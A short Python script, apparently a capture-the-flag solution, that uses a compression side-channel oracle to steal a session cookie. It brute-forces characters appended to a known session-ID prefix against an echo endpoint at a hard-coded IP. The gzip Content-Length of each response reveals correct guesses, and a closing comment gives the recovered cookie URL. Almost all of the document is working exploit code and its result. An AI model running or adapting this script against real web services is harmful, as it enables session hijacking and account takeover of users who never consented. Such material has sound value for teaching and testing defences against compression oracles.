#Content-Length of gzip'ed text is informative.

#```python
import requests
import re

a=requests.Session()

z = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_="

def get_len(s):
    return int(re.search("'Content-Length': '([0-9]+)'", s)[1])

for i in ['ww6mveDaJESyPqfvcFKq1A' + x for x in z]:
    for j in z:
        b = a.post('http://47.93.114.77:38700/root/echo', params={'Cookie':'sessionid=' + i + j}, data={'debug':1}).text
        if get_len(b) < 247:
            print(i+j, get_len(b), '+++' if b.count('<del>sessionid</del>') > 1 else '')
#```

#result:
#http://47.93.114.77:38700/root/echo?Cookie=sessionid=ww6mveDaJESyPqfvcFKq1A==